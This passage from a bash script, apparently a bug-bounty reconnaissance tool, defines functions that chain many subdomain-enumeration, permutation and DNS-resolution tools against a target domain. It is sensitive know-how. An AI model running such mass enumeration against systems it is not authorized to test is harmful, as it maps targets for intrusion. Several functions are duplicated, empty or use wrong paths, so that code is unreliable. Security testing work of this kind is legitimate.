		rcert -list ${SUBDOMAINDIR}/*.subs | unew | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/certinfo.subs
	fi

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/certinfo.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/certinfo.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] IPRANGES${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/certinfo.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

ARINRANGE(){
	START_SPINNER "${BGREEN}ARINRANGE${RESET}"

	cat ${SUBDOMAINDIR}/orgs.txt | arinrange --silent 2>/dev/null | mapcidr -silent -aggregate | unew -el -t -q ${SUBDOMAINDIR}/ips.txt

	# Reuse old scanned data
	# cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/certinfo.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/certinfo.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] ARINRANGE${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/ips.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

SPK(){
	START_SPINNER "${BGREEN}SPK${RESET}"

	if [ "$SPK_SCAN_MODE" = "NORMAL" ]; then
		for ORG in $(cat ${SUBDOMAINDIR}/orgs.txt);do spk -silent -s "$ORG" | unew -el -t -q ${SUBDOMAINDIR}/ips.txt;done
	fi

	if [ "$SPK_SCAN_MODE" = "ADVANCED" ]; then
		for ORG in $(cat ${SUBDOMAINDIR}/orgs.txt);do spk -silent -s "$ORG" | unew -el -t -q ${SUBDOMAINDIR}/ips.txt;done
	fi

	# Reuse old scanned data
	# cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/certinfo.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/certinfo.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] SPK${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/ips.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

ASNMAP(){
	START_SPINNER "${BGREEN}ASNMAP${RESET}"

	if [ "$ASNMAP_SCAN_MODE" = "NORMAL" ]; then
		cat ${SUBDOMAINDIR}/*.subs | unew | certinfo -silent -c 50 | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/certinfo.subs
	fi

	if [ "$ASNMAP_SCAN_MODE" = "ADVANCED" ]; then
		rcert -list ${SUBDOMAINDIR}/*.subs | unew | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/certinfo.subs
	fi

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/certinfo.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/certinfo.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] ASNMAP${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/certinfo.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

ANALYTICSRELATIONSHIPS(){
	START_SPINNER "${BGREEN}ANALYTICSRELATIONSHIPS${RESET}"

	if [ "$ASNMAP_SCAN_MODE" = "NORMAL" ]; then
		analyticsrelationships --url https://www.example.com
	fi

	if [ "$ASNMAP_SCAN_MODE" = "ADVANCED" ]; then
		cat ${SUBDOMAINDIR}/*.subs | analyticsrelationships
	fi

	# Reuse old scanned data
	# cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/builtwith.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/builtwith.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] ANALYTICSRELATIONSHIPS${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/builtwith.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

UDON(){
	START_SPINNER "${BGREEN}UDON${RESET}"

	for id in $(cat ${SUBDOMAINDIR}/tag-history.txt);do udon -silent -s $id | unew -el -i -t -q ${SUBDOMAINDIR}/udon.subs;done

	# Reuse old scanned data
	# cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/udon.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/builtwith.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] UDON${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/builtwith.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

BUILTWITH(){
	START_SPINNER "${BGREEN}BUILTWITH${RESET}"

	echo "$TARGET" | builtwithsubs --silent 2>/dev/null | egrep -av "^Removed$" | unew -el -i -t -q ${SUBDOMAINDIR}/builtwith.subs

	# Reuse old scanned data
	# cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/builtwith.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/builtwith.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] BUILTWITH${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/builtwith.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

WHOXYSUBS(){
	START_SPINNER "${BGREEN}WHOXYSUBS${RESET}"

	cat ${SUBDOMAINDIR}/orgs.txt | whoxysubs --silent -s company | unew -el -i -t -q ${SUBDOMAINDIR}/whoxysubs.subs
	cat ${SUBDOMAINDIR}/emails.txt | whoxysubs --silent -s email | unew -el -i -t -q ${SUBDOMAINDIR}/whoxysubs.subs
	echo "$TARGET" | whoxysubs --silent -s keyword | unew -el -i -t -q ${SUBDOMAINDIR}/whoxysubs.subs
	# echo "elon musk" | whoxysubs --silent -s name | unew -el -i -t -q ${SUBDOMAINDIR}/whoxysubs.subs

	# Reuse old scanned data
	# cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/builtwith.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/builtwith.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] WHOXYSUBS${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/builtwith.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Certificate Transperency
KAEFERJAEGER(){
	START_SPINNER "${BGREEN}KAEFERJAEGER${RESET}"

	curl -s "https://kaeferjaeger.gay/sni-ip-ranges/amazon/ipv4_merged_sni.txt" | awk -F'-- ' '{print $2}' |  tr ' ' '\n' | tr '[' ' ' | sed 's/\]//' | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/kaeferjaeger.subs
	curl -s "https://kaeferjaeger.gay/sni-ip-ranges/digitalocean/ipv4_merged_sni.txt" | awk -F'-- ' '{print $2}' |  tr ' ' '\n' | tr '[' ' ' | sed 's/\]//' | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/kaeferjaeger.subs
	curl -s "https://kaeferjaeger.gay/sni-ip-ranges/google/ipv4_merged_sni.txt" | awk -F'-- ' '{print $2}' |  tr ' ' '\n' | tr '[' ' ' | sed 's/\]//' | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/kaeferjaeger.subs
	curl -s "https://kaeferjaeger.gay/sni-ip-ranges/microsoft/ipv4_merged_sni.txt" | awk -F'-- ' '{print $2}' |  tr ' ' '\n' | tr '[' ' ' | sed 's/\]//' | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/kaeferjaeger.subs
	curl -s "https://kaeferjaeger.gay/sni-ip-ranges/oracle/ipv4_merged_sni.txt" | awk -F'-- ' '{print $2}' |  tr ' ' '\n' | tr '[' ' ' | sed 's/\]//' | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/kaeferjaeger.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] KAEFERJAEGER${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/kaeferjaeger.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

TRICKESTCLOUD(){
	START_SPINNER "${BGREEN}TRICKESTCLOUD${RESET}"

	cat wordlists/trickestcloud_ssl.txt | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/trickestcloud_ssl.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] TRICKESTCLOUD${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/trickestcloud_ssl.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


CERO(){
	START_SPINNER "${BGREEN}CERO${RESET}"

	cat ${SUBDOMAINDIR}/*.subs | unew | cero -c ${CERO_THREADS} -t ${CERO_TIMEOUT} | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/cero.subs

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/cero.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/cero.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] CERO${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/cero.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

CERTINFO(){
	START_SPINNER "${BGREEN}CERTINFO${RESET}"

	if [ "$CERTINFO_SCAN_MODE" = "NORMAL" ]; then
		cat ${SUBDOMAINDIR}/*.subs | unew | certinfo -silent -c 50 | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/certinfo.subs
	fi

	if [ "$CERTINFO_SCAN_MODE" = "ADVANCED" ]; then
		rcert -list ${SUBDOMAINDIR}/*.subs | unew | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/certinfo.subs
	fi

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/certinfo.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/certinfo.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] CERTINFO${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/certinfo.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Content Security Policy
CSPRECON(){
	START_SPINNER "${BGREEN}CSPRECON${RESET}"

	# cat ${SUBDOMAINDIR}/*.subs | unew | csprecon -silent -c ${CSPRECON_THREADS} -t ${CSPRECON_TIMEOUT} | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/csprecon.subs
	timelimitx -t ${CSPRECON_TIMELIMITX} "cat ${SUBDOMAINDIR}/*.subs | unew | csprecon -silent -c ${CSPRECON_THREADS} -t ${CSPRECON_TIMEOUT} | eval ${SUBDOMAIN_FILTER} | grep -aE \"^(($TARGET)|([^.]+\\.$TARGET))$\" | unew -el -i -t -q ${SUBDOMAINDIR}/csprecon.subs"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/csprecon.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/csprecon.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] CSPRECON${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/csprecon.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

CSPFINDER(){
	START_SPINNER "${BGREEN}CSPFINDER${RESET}"

	cat ${SUBDOMAINDIR}/*.subs | unew | cspfinder -silent -concurrent ${CSPFINDER_THREADS} -timeout ${CSPFINDER_TIMEOUT} | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/cspfinder.subs

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/cspfinder.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/cspfinder.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] CSPFINDER${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/cspfinder.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

JSUBFINDER(){
	START_SPINNER "${BGREEN}JSUBFINDER${RESET}"

	if [ "$JSUBFINDER_SCAN_MODE" = "NORMAL" ]; then
		echo ${TARGET} | jsubfinder search | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/jsubfinder.subs
	fi

	if [ "$JSUBFINDER_SCAN_MODE" = "ADVANCED" ]; then
		cat ${SUBDOMAINDIR}/*.subs | jsubfinder search | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/jsubfinder.subs
	fi

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/jsubfinder.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/jsubfinder.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] JSUBFINDER${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/jsubfinder.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

ALLSUBDOMAIN(){
	START_SPINNER "${BGREEN}ALLSUBDOMAIN${RESET}"

	cat ${SUBDOMAINDIR}/*.subs | unew -el -i -t -q ${ROOT_SUBDOMAINDIR}/allsubs.txt

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/subdomain/allsubs.txt 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${ROOT_SUBDOMAINDIR}/allsubs.txt

	# Remove out-of-scope subdomains using dynamic OOS file
	if [[ -n "$OOS_FILE" ]]; then
		cat ${ROOT_SUBDOMAINDIR}/allsubs.txt | oosexclude -e "$OOS_FILE" | unew -el -i -t -q ${ROOT_SUBDOMAINDIR}/oosexclude_allsubs.txt
		rm -rf ${ROOT_SUBDOMAINDIR}/allsubs.txt
		mv ${ROOT_SUBDOMAINDIR}/oosexclude_allsubs.txt ${ROOT_SUBDOMAINDIR}/allsubs.txt
	fi

	STOP_SPINNER
	echo -e "${BGREEN}[+] ALLSUBDOMAIN${RESET}: $(wc -l 2>/dev/null < ${ROOT_SUBDOMAINDIR}/allsubs.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

DNSXBRUTE(){
	START_SPINNER "${BGREEN}DNSXBRUTE${RESET}"

	if [ "$DNSXBRUTE_SCAN_MODE" = "QUICK" ]; then
		dnsx -duc -silent -d $TARGET -w wordlists/all_hostnames.txt -a -r $RESOLVERS_WORDLIST | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/dnsxbrute.subs
	fi

	if [ "$DNSXBRUTE_SCAN_MODE" = "NORMAL" ]; then
		dnsx -duc -silent -d ${ROOT_SUBDOMAINDIR}/allsubs.txt -w wordlists/all_hostnames.txt -a -r $RESOLVERS_WORDLIST | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/dnsxbrute.subs
	fi

	if [ "$DNSXBRUTE_SCAN_MODE" = "ADVANCED" ]; then
		dnsx -duc -silent -d ${ROOT_SUBDOMAINDIR}/allsubs.txt -w wordlists/all_hostnames.txt -a -r $RESOLVERS_WORDLIST | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/dnsxbrute.subs
		dnsx -duc -silent -d ${SUBDOMAINDIR}/dnsxbrute.subs -w wordlists/all_hostnames.txt -a -r $RESOLVERS_WORDLIST | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/dnsxbruteadv.subs
	fi

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/dnsxbrute.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/dnsxbrute.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] DNSXBRUTE${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/dnsxbrute.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

SUBWIZ(){
	START_SPINNER "${BGREEN}SUBWIZ${RESET}"

	subwiz -i ${ROOT_SUBDOMAINDIR}/allsubs.txt --num_predictions 5000 -o ${SUBDOMAINDIR}/tmp_subwiz.subs &>/dev/null
	cat ${SUBDOMAINDIR}/tmp_subwiz.subs | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/subwiz.subs

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/subwiz.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/subwiz.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] SUBWIZ${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/subwiz.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

RECURSIVESUBENUM(){
	START_SPINNER "${BGREEN}RECURSIVESUBENUM${RESET}"

	cat ${ROOT_SUBDOMAINDIR}/allsubs.txt | subfinder -duc -silent -all -config ~/.config/subfinder/config.yaml -pc ~/.config/subfinder/provider-config.yaml -max-time ${SUBFINDER_ENUM_TIMEOUT} | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/recursivesubenum.subs


	cat ${ROOT_SUBDOMAINDIR}/allsubs.txt | haktrails subdomains

	STOP_SPINNER
	echo -e "${BGREEN}[+] RECURSIVESUBENUM${RESET}: $(wc -l 2>/dev/null < ${ROOT_SUBDOMAINDIR}/recursivesubenum.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

# Subdomain Permutations
ALTDNS(){
	START_SPINNER "${BGREEN}ALTDNS${RESET}"

	altdns -i ${ROOT_SUBDOMAINDIR}/allsubs.txt -o ${SUBDOMAINDIR}/altdns.subs -w ${ROOT_WORDLISTDIR}/perms.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] ALTDNS${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/altdns.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

PUREDNS(){
	START_SPINNER "${BGREEN}PUREDNS${RESET}"

	DOWNLOAD_UPDATED_RESOLVERS
	puredns bruteforce wordlists/2m-subdomains.txt -d wildcards.txt -r $RESOLVERS_WORDLIST --skip-sanitize --skip-validation --skip-wildcard-filter --wildcard-tests ${PUREDNS_WILDCARD_TESTS} -w puredns_output.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] PUREDNS${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/puredns.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

ALTERX(){
	START_SPINNER "${BGREEN}ALTERX${RESET}"

	cat ${ROOT_SUBDOMAINDIR}/allsubs.txt | alterx -silent -o ${SUBDOMAINDIR}/alterx.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] ALTERX${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/alterx.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

GOTATOR(){
	START_SPINNER "${BGREEN}GOTATOR${RESET}"

	gotator -silent -sub ${ROOT_SUBDOMAINDIR}/allsubs.txt -perm ${ROOT_WORDLISTDIR}/perms.txt -depth ${GOTATOR_DEPTH} -numbers ${GOTATOR_NUMBERS} -mindup -adv -md | head -c ${GOTATOR_MAX_SIZE} >> ${SUBDOMAINDIR}/gotator.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] GOTATOR${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/gotator.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

DNSGEN(){
	START_SPINNER "${BGREEN}DNSGEN${RESET}"

	cat ${ROOT_SUBDOMAINDIR}/allsubs.txt | dnsgen -w ${ROOT_WORDLISTDIR}/perms.txt - >> ${SUBDOMAINDIR}/dnsgen.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] DNSGEN${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/dnsgen.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

GOALTDNS(){
	START_SPINNER "${BGREEN}GOALTDNS${RESET}"

	goaltdns -l ${ROOT_SUBDOMAINDIR}/allsubs.txt -w ${ROOT_WORDLISTDIR}/perms.txt -o ${SUBDOMAINDIR}/goaltdns.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] GOALTDNS${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/goaltdns.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

RIPGEN(){
	START_SPINNER "${BGREEN}RIPGEN${RESET}"

	ripgen -d ${ROOT_SUBDOMAINDIR}/allsubs.txt -w ${ROOT_WORDLISTDIR}/perms.txt > ${SUBDOMAINDIR}/ripgen.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] RIPGEN${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/ripgen.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

DMUT(){
	START_SPINNER "${BGREEN}DMUT${RESET}"

	cat subdomainList.txt | dmut -d mutations.txt -w 100 --dns-timeout 300 --dns-retries 5 --dns-errorLimit 25 --show-stats -o results.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] DMUT${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/dnscewl.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

DNSCEWL(){
	START_SPINNER "${BGREEN}DNSCEWL${RESET}"

	STOP_SPINNER
	echo -e "${BGREEN}[+] DNSCEWL${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/dnscewl.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


ALLSUBDOMAINPERMUTATIONS(){
	START_SPINNER "${BGREEN}ALLSUBDOMAINPERMUTATIONS${RESET}"

	cat ${SUBDOMAINDIR}/*.subs | unew -el -i -t -q ${SUBDOMAINDIR}/allpermutationssubs.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] ALLSUBDOMAINPERMUTATIONS${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/allpermutationssubs.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


MANUAL_SUBDOMAIN_RESOLVING(){
	START_SPINNER "${BGREEN}MANUAL_SUBDOMAIN_RESOLVING${RESET}"

    echo -e "${GRAY}[!] $SUBDOMAINDIR/allpermutationssubs.txt resolve subdomain in vps, it can be google cloud shell and then add after resolved ${ROOT_SUBDOMAINDIR}/puredns_resolve.subs. Please choose an option:${RESET}"
    echo -e "${GRAY}1. Wait for up to 1440 minutes, still resolving subdomain but allow me to continue if i'm done earlier by pressing Enter button"
    echo -e "${GRAY}2. Done, I have resolved subdomain don't wait now"
    echo -e "${GRAY}3. Skip, I don't have time for manually doing this work"

    # Read user input with a timeout of 1 minute
    read -t ${MANUAL_SUBDOMAIN_RESOLVING_OPTION_WAIT} -p "Select an option (1/2/3): " option

    # If no input after 60 seconds, automatically select Option 1
    if [ -z "$option" ]; then
        option=${MANUAL_SUBDOMAIN_RESOLVING_OPTION_SELECT}
        echo -e "\n${GRAY}[+] No input received, automatically choosing Option ${MANUAL_SUBDOMAIN_RESOLVING_OPTION_SELECT}${RESET}"
    fi

    case "$option" in
        1)
            echo -e "${BGREEN}[+] Waiting for up to 1440 minutes. Press Enter if you're done early...${RESET}"

            # Display prompt once and enter wait loop
            counter=0
            while true; do
                read -t 60 -n 1 input
                if [ $? -eq 0 ]; then
                    echo -e "${BGREEN}[+] Done early! Proceeding...${RESET}"
                    break
                fi
                # Exit after 30 minutes if Enter is not pressed
                ((counter++))
                if [ $counter -eq ${MANUAL_SUBDOMAIN_RESOLVING_TIME} ]; then
                    echo -e "${BGREEN}[+] 1440 minutes have passed. Proceeding...${RESET}"
                    break
                fi
            done
            ;;
        2)
            echo -e "${BGREEN}[+] Done with resolving subdomain. Proceeding...${RESET}"
            ;;
        3)
            echo -e "${YELLOW}[!] Skipping don't have to for manually doing this work.${RESET}"
            return
            ;;
        *)
            echo -e "${YELLOW}[!] Invalid option. Skipping manual removing unnecessary urls manually.${RESET}"
            return
            ;;
    esac

    # Display the count of lines in allpermutationssubs.txt
	STOP_SPINNER
    echo -e "${BGREEN}[+] MANUAL_SUBDOMAIN_RESOLVING${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/allpermutationssubs.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

# Subdomain Resolving
PUREDNS(){
	START_SPINNER "${BGREEN}PUREDNS${RESET}"

	if [ "$IS_U_USING_VPS" = "TRUE" ]; then
		DOWNLOAD_UPDATED_RESOLVERS
		puredns resolve ${SUBDOMAINDIR}/allpermutationssubs.txt -r $RESOLVERS_WORDLIST --resolvers-trusted wordlists/resolvers-trusted.txt --skip-sanitize --skip-validation --skip-wildcard-filter --wildcard-tests ${PUREDNS_WILDCARD_TESTS} -w ${ROOT_SUBDOMAINDIR}/puredns_resolve.subs
	else
		# if IS_U_USING_VPS is FALSE then ask user to resolve subdomain in vps, it can be google cloud shell
		MANUAL_SUBDOMAIN_RESOLVING
	fi

	STOP_SPINNER
	echo -e "${BGREEN}[+] PUREDNS${RESET}: $(wc -l 2>/dev/null < ${ROOT_SUBDOMAINDIR}/puredns_resolve.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

SHUFFLEDNS(){
	START_SPINNER "${BGREEN}SHUFFLEDNS${RESET}"

	if [ "$IS_U_USING_VPS" = "TRUE" ]; then
		DOWNLOAD_UPDATED_RESOLVERS
		shuffledns -silent -l ${SUBDOMAINDIR}/allpermutationssubs.txt -r $RESOLVERS_WORDLIST -o ${ROOT_SUBDOMAINDIR}/shuffledns_resolve.subs
	else
		# if IS_U_USING_VPS is FALSE then ask user to resolve subdomain in vps, it can be google cloud shell
		MANUAL_SUBDOMAIN_RESOLVING
	fi

	STOP_SPINNER
	echo -e "${BGREEN}[+] SHUFFLEDNS${RESET}: $(wc -l 2>/dev/null < ${ROOT_SUBDOMAINDIR}/shuffledns_resolve.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

MASSDNS(){
	START_SPINNER "${BGREEN}MASSDNS${RESET}"

	if [ "$IS_U_USING_VPS" = "TRUE" ]; then
		echo -e "I will add later.."
		massdns -r $RESOLVERS_WORDLIST -q -t A -o S -w ./$domain/subdomain/all_subdomain.txt ./$domain/ips/massdns.raw
    	cat ./$domain/ips/massdns.raw | grep -a -e ' A ' |  cut -d 'A' -f 2 | tr -d ' ' | anew -q ./$domain/ips/resolved_ips.txt
	else
		# if IS_U_USING_VPS is FALSE then ask user to resolve subdomain in vps, it can be google cloud shell
		MANUAL_SUBDOMAIN_RESOLVING
	fi

	STOP_SPINNER
	echo -e "${BGREEN}[+] MASSDNS${RESET}: $(wc -l 2>/dev/null < ${ROOT_SUBDOMAINDIR}/massdns_resolve.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Subdomain DNS Enumeration
DNSX(){
	START_SPINNER "${BGREEN}DNSX${RESET}"

